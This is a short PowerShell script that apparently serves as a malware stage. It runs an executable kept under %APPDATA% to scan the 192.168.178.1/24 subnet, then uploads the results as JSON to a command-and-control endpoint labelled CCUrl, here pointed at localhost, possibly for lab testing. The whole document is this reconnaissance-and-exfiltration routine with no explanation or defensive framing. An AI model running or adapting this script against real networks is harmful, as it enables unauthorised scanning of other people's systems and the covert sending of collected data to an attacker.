$exe_path = Join-Path $env:APPDATA "environment"
$CCUrl = "127.0.0.1:5000/upload"

Set-Location -Path $exe_path
.\main.exe -h 192.168.178.1/24 > result.txt

$fileContent = Get-Content -Path result.txt -Raw
$payload = @{
    fileContent = $fileContent
}
$jsonPayload = $payload | ConvertTo-Json

Invoke-RestMethod -Uri $CCUrl -Method Post -Body $jsonPayload -ContentType "application/json"
